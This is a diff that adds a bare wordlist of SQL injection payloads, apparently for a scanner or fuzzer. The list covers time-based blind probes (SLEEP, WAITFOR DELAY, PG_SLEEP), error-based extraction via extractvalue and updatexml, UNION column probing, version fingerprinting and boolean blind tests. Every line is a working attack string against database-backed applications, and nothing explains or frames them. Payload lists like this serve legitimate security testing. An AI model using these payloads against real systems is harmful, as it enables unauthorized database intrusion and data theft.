@@ -1,0 +1,15 @@
+' AND SLEEP(3)--
+' OR SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+' AND 1=(SELECT 1 FROM PG_SLEEP(3))--
+' AND extractvalue(1,concat(0x7e,version))--
+' AND updatexml(1,concat(0x7e,version),1)--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT @@version,NULL--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING(@@version,1,1))>52--
+' AND 1=1 AND 'a'='a
+' AND 1=2 AND 'a'='a
